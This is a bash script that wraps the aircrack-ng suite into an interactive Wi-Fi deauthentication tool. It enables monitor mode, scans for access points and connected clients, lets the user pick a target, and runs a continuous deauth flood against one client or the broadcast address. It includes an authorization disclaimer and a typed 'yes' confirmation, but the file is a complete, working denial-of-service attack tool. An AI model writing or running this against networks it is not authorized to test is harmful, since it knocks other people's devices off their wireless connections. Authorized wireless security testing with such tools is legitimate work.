#!/bin/bash
#
# doubletap.sh - Interactive aircrack-ng suite wrapper
# Automates: interface -> monitor mode -> band scan -> target select -> focused scan -> target select -> deauth
#
# Part of the AmpedGH wireless recon toolkit.
# Requires: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng), root privileges
# Use only on networks you own or are explicitly authorized to test.
#

set -uo pipefail

# ── Colors ──────────────────────────────────────────────────────────────
C_RESET='\033[0m'
C_TEAL='\033[38;5;50m'
C_TEAL_B='\033[1;38;5;50m'
C_AMBER='\033[38;5;214m'
C_RED='\033[1;38;5;203m'
C_DIM='\033[2;37m'
C_WHITE='\033[1;97m'
C_GREEN='\033[38;5;120m'

info()  { echo -e "${C_TEAL}[*]${C_RESET} $1"; }
warn()  { echo -e "${C_AMBER}[!]${C_RESET} $1"; }
err()   { echo -e "${C_RED}[!]${C_RESET} $1" >&2; }
ok()    { echo -e "${C_GREEN}[+]${C_RESET} $1"; }

banner() {
    echo -e "${C_AMBER}"
    cat <<'BANNER'
        .-""""""-.
      .'  o  o  o  `.
     /  o    o    o  \
    |  o   ___   o    |
    |    .'   `.   o  |
    |   /  o o  \     |
    |  | o     o |  o |
     \  \  o o  /  o /
      `. `-...-' .'
        `-.....-'
BANNER
    echo -e "${C_RESET}"
    echo -e "${C_AMBER}"
    cat <<'LOGO'
 ___   ___  _   _ ___ _    ___ _____ _   ___
|   \ / _ \| | | | _ ) |  | __|_   _/_\ | _ \
| |) | (_) | |_| | _ \ |__| _|  | |/ _ \|  _/
|___/ \___/ \___/|___/____|___| |_/_/ \_\_|
LOGO
    echo -e "${C_RESET}"
    echo -e "${C_TEAL}                 [ GOBBLEGUM WIRELESS RECON ]${C_RESET}"
    echo
}

SCAN_DIR="$(mktemp -d /tmp/doubletap.XXXXXX)"
IFACE=""
MONIFACE=""
CSV_PREFIX="$SCAN_DIR/scan"
FOCUS_PREFIX="$SCAN_DIR/focus"
KILLED_PROCESSES=0

cleanup() {
    echo
    info "Cleaning up..."
    if [[ -n "$MONIFACE" ]]; then
        info "Stopping monitor mode on $MONIFACE..."
        airmon-ng stop "$MONIFACE" >/dev/null 2>&1
    fi
    if [[ "$KILLED_PROCESSES" -eq 1 ]]; then
        info "Restoring NetworkManager..."
        systemctl restart NetworkManager >/dev/null 2>&1
    fi
    rm -rf "$SCAN_DIR"
    info "Done."
}
trap cleanup EXIT INT TERM

require_root() {
    if [[ $EUID -ne 0 ]]; then
        err "This script must be run as root (sudo)."
        exit 1
    fi
}

check_deps() {
    for cmd in airmon-ng airodump-ng aireplay-ng; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            err "Missing dependency: $cmd. Install aircrack-ng suite."
            exit 1
        fi
    done
}

# Converts a 1-based index into a selection label: 1=a, 2=b, ... 26=z, then rolls over to
# plain numbers (27, 28, ...) once the alphabet is exhausted. Keeps single-hand phone typing
# on the default letter keyboard for the common case, without an unbounded label scheme.
idx_to_label() {
    local n=$1
    if (( n <= 26 )); then
        printf "\\$(printf '%03o' $((96 + n)))"
    else
        echo "$n"
    fi
}

select_interface() {
    info "Available wireless interfaces:"
    mapfile -t IFACES < <(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')
    if [[ ${#IFACES[@]} -eq 0 ]]; then
        err "No wireless interfaces found."
        exit 1
    fi

    declare -A IFACE_MAP
    for i in "${!IFACES[@]}"; do
        local label
        label=$(idx_to_label "$((i+1))")
        printf "  ${C_AMBER}[%s]${C_RESET} %s\n" "$label" "${IFACES[$i]}"
        IFACE_MAP[$label]="${IFACES[$i]}"
    done

    read -rp "$(echo -e ${C_WHITE}Select interface: ${C_RESET})" sel
    sel="${sel,,}"
    if [[ -z "${IFACE_MAP[$sel]:-}" ]]; then
        err "Invalid selection."
        exit 1
    fi
    IFACE="${IFACE_MAP[$sel]}"
    info "Selected interface: $IFACE"

    read -rp "$(echo -e ${C_WHITE}Kill interfering processes \(NetworkManager, wpa_supplicant, etc.\)? [y/N]: ${C_RESET})" kill_choice
    if [[ "$kill_choice" =~ ^[Yy]$ ]]; then
        info "Killing interfering processes..."
        airmon-ng check kill >/dev/null 2>&1
        KILLED_PROCESSES=1
    else
        warn "Skipping process kill. Note: NetworkManager/wpa_supplicant may interfere with monitor mode or cause airodump to keep resetting the channel."
    fi

    info "Enabling monitor mode on $IFACE..."
    airmon-ng start "$IFACE" >/tmp/airmon_start.log 2>&1

    # Determine resulting monitor interface name (varies by driver: wlan0mon, wlan0, etc.)
    MONIFACE=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E "mon$|^${IFACE}$" | head -n1)
    if [[ -z "$MONIFACE" ]]; then
        MONIFACE="${IFACE}mon"
    fi
    info "Monitor interface: $MONIFACE"
}

select_band() {
    echo
    info "Select band to scan:"
    echo -e "  ${C_AMBER}[a]${C_RESET} 2.4GHz"
    echo -e "  ${C_AMBER}[b]${C_RESET} 5GHz"
    read -rp "$(echo -e ${C_WHITE}Choice: ${C_RESET})" band_choice
    band_choice="${band_choice,,}"
    if [[ "$band_choice" == "a" ]]; then
        BAND_FLAG="--channel 1,2,3,4,5,6,7,8,9,10,11"
        BAND_LABEL="2.4GHz"
    elif [[ "$band_choice" == "b" ]]; then
        BAND_FLAG="--band a"
        BAND_LABEL="5GHz"
    else
        err "Invalid choice."
        exit 1
    fi
    info "Band selected: $BAND_LABEL"
}

# Runs airodump-ng in background, writes CSV, and waits for the user to press Enter (blank input) to stop
# $1 = prefix, $2 = "quiet" or "live", remaining args = extra airodump-ng args
run_scan() {
    local prefix="$1"
    local mode="$2"
    shift 2
    local extra_args=("$@")

    echo
    info "Starting airodump-ng scan. Press Enter at any time to stop."
    if [[ "$mode" == "live" ]]; then
        info "Tip: give this at least 15-30 seconds so client devices have a chance to be heard."
    fi
    rm -f "${prefix}"-*.csv 2>/dev/null

    if [[ "$mode" == "live" ]]; then
        airodump-ng "${extra_args[@]}" -w "$prefix" --output-format csv "$MONIFACE" &
    else
        airodump-ng "${extra_args[@]}" -w "$prefix" --output-format csv "$MONIFACE" \
            >/tmp/airodump_scan.log 2>&1 &
    fi
    local dump_pid=$!
    local ticker_pid=""

    # Quiet mode: instead of switching over to airodump-ng's own full-screen table,
    # poll the CSV it's writing and print each newly discovered SSID as its own line,
    # right here in this same window, as it's found.
    if [[ "$mode" == "quiet" ]]; then
        (
            declare -A seen
            while true; do
                local csv_file
                csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)
                if [[ -n "$csv_file" && -f "$csv_file" ]]; then
                    while IFS= read -r line; do
                        local bssid essid
                        bssid=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
                        essid=$(echo "$line" | awk -F', ' '{print $14}' | xargs)
                        [[ -z "$bssid" ]] && continue
                        [[ -n "${seen[$bssid]:-}" ]] && continue
                        seen[$bssid]=1
                        [[ -z "$essid" ]] && essid="<hidden>"
                        echo -e "  ${C_RED}${essid}${C_RESET}"
                    done < <(tr -d '\r' < "$csv_file" | sed -n '/^BSSID/,/^$/p' | sed '1d;$d' | sed '/^$/d')
                fi
                sleep 2
            done
        ) &
        ticker_pid=$!
    fi

    # Blocks until the user presses Enter (blank input = stop)
    read -rp "$(echo -e ${C_WHITE}[Press Enter to stop]${C_RESET} )"
    kill "$dump_pid" >/dev/null 2>&1
    wait "$dump_pid" 2>/dev/null
    if [[ -n "$ticker_pid" ]]; then
        kill "$ticker_pid" >/dev/null 2>&1
        wait "$ticker_pid" 2>/dev/null
    fi

    # Give airodump a moment to flush the CSV file
    sleep 1
}

# Parses the airodump CSV for APs and prints a lettered list; sets AP_BSSID / AP_CHANNEL / AP_ESSID
select_target_ap() {
    local prefix="$1"
    local csv_file
    csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)

    if [[ -z "$csv_file" || ! -f "$csv_file" ]]; then
        err "No scan results found."
        exit 1
    fi

    # AP section of the CSV is between the header row and the blank line before "Station MAC"
    # Normalize CRLF first: a stray \r makes blank lines fail to match /^$/, causing the
    # AP-only range to run past the intended stop and swallow station rows too.
    mapfile -t ap_lines < <(tr -d '\r' < "$csv_file" | sed -n '/^BSSID/,/^$/p' | sed '1d;$d' | sed '/^$/d')

    if [[ ${#ap_lines[@]} -eq 0 ]]; then
        err "No access points found in scan."
        exit 1
    fi

    echo
    info "Discovered access points:"
    printf "  ${C_DIM}%-4s %-19s %-4s %-5s %s${C_RESET}\n" "#" "BSSID" "CH" "PWR" "ESSID"

    declare -gA AP_MAP_BSSID
    declare -gA AP_MAP_CHANNEL
    declare -gA AP_MAP_ESSID

    local idx=1
    for line in "${ap_lines[@]}"; do
        local bssid channel power essid label
        bssid=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
        channel=$(echo "$line" | awk -F', ' '{print $4}' | xargs)
        power=$(echo "$line" | awk -F', ' '{print $9}' | xargs)
        essid=$(echo "$line" | awk -F', ' '{print $14}' | xargs)

        [[ -z "$bssid" ]] && continue

        label=$(idx_to_label "$idx")
        printf "  ${C_AMBER}%-4s${C_RESET} %-19s %-4s %-5s ${C_RED}%s${C_RESET}\n" "$label" "$bssid" "$channel" "$power" "$essid"
        AP_MAP_BSSID[$label]="$bssid"
        AP_MAP_CHANNEL[$label]="$channel"
        AP_MAP_ESSID[$label]="$essid"
        ((idx++))
    done

    read -rp "$(echo -e ${C_WHITE}Select target AP: ${C_RESET})" ap_sel
    ap_sel="${ap_sel,,}"
    if [[ -z "${AP_MAP_BSSID[$ap_sel]:-}" ]]; then
        err "Invalid selection."
        exit 1
    fi

    AP_BSSID="${AP_MAP_BSSID[$ap_sel]}"
    AP_CHANNEL="${AP_MAP_CHANNEL[$ap_sel]}"
    AP_ESSID="${AP_MAP_ESSID[$ap_sel]}"
    info "Target selected: $AP_ESSID ($AP_BSSID) on channel $AP_CHANNEL"
}

# Parses focused-scan CSV for stations connected to AP_BSSID; sets CLIENT_MAC
select_target_client() {
    local prefix="$1"
    local csv_file
    csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)

    if [[ -z "$csv_file" || ! -f "$csv_file" ]]; then
        err "No scan results found."
        exit 1
    fi

    mapfile -t station_lines < <(tr -d '\r' < "$csv_file" | sed -n '/^Station MAC/,$p' | sed '1d' | sed '/^$/d')

    echo
    info "Connected clients (or type 'all' to target the broadcast address / all clients):"
    printf "  ${C_DIM}%-4s %-19s${C_RESET}\n" "#" "Station MAC"

    declare -gA CLIENT_MAP
    local idx=1
    local matched=0
    for line in "${station_lines[@]}"; do
        local sta_mac assoc_bssid label
        sta_mac=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
        assoc_bssid=$(echo "$line" | awk -F', ' '{print $6}' | xargs)

        [[ -z "$sta_mac" ]] && continue
        [[ "$assoc_bssid" != "$AP_BSSID" ]] && continue

        label=$(idx_to_label "$idx")
        printf "  ${C_AMBER}%-4s${C_RESET} ${C_TEAL_B}%-19s${C_RESET}\n" "$label" "$sta_mac"
        CLIENT_MAP[$label]="$sta_mac"
        matched=1
        ((idx++))
    done

    # Fallback: strict BSSID-field matching found nothing, but the focused scan was already
    # narrowed to this AP's channel/BSSID via airodump-ng flags, so list all stations seen.
    if [[ "$matched" -eq 0 ]]; then
        warn "No stations matched by BSSID field — showing all stations seen during focused scan."
        for line in "${station_lines[@]}"; do
            local sta_mac label
            sta_mac=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
            [[ -z "$sta_mac" ]] && continue
            label=$(idx_to_label "$idx")
            printf "  ${C_AMBER}%-4s${C_RESET} ${C_TEAL_B}%-19s${C_RESET}\n" "$label" "$sta_mac"
            CLIENT_MAP[$label]="$sta_mac"
            ((idx++))
        done
    fi

    read -rp "$(echo -e ${C_WHITE}Select client \(or \'all\' for broadcast\): ${C_RESET})" cl_sel
    cl_sel="${cl_sel,,}"
    if [[ "$cl_sel" == "all" ]]; then
        CLIENT_MAC="FF:FF:FF:FF:FF:FF"
    elif [[ -n "${CLIENT_MAP[$cl_sel]:-}" ]]; then
        CLIENT_MAC="${CLIENT_MAP[$cl_sel]}"
    else
        err "Invalid selection."
        exit 1
    fi
    ok "Client selected: $CLIENT_MAC"
}

do_deauth() {
    echo
    info "Preparing deauth: AP=$AP_BSSID CH=$AP_CHANNEL Client=$CLIENT_MAC"
    read -rp "$(echo -e ${C_RED}Confirm you are authorized to test this network. Type \'yes\' to proceed: ${C_RESET})" confirm
    if [[ "$confirm" != "yes" ]]; then
        warn "Aborted."
        return
    fi

    iw dev "$MONIFACE" set channel "$AP_CHANNEL" >/dev/null 2>&1

    if [[ "$CLIENT_MAC" == "FF:FF:FF:FF:FF:FF" ]]; then
        aireplay-ng -0 0 -a "$AP_BSSID" "$MONIFACE"
    else
        aireplay-ng -0 0 -a "$AP_BSSID" -c "$CLIENT_MAC" "$MONIFACE"
    fi
}

main() {
    banner
    require_root
    check_deps
    select_interface
    select_band

    # Phase 1: broad band scan (quiet — output suppressed)
    run_scan "$CSV_PREFIX" quiet $BAND_FLAG
    select_target_ap "$CSV_PREFIX"

    # Phase 2: focused scan on target channel (live — output visible)
    echo
    info "Locking to channel $AP_CHANNEL for focused scan on $AP_ESSID..."
    run_scan "$FOCUS_PREFIX" live --bssid "$AP_BSSID" --channel "$AP_CHANNEL"
    select_target_client "$FOCUS_PREFIX"

    # Phase 3: deauth
    do_deauth
}

main
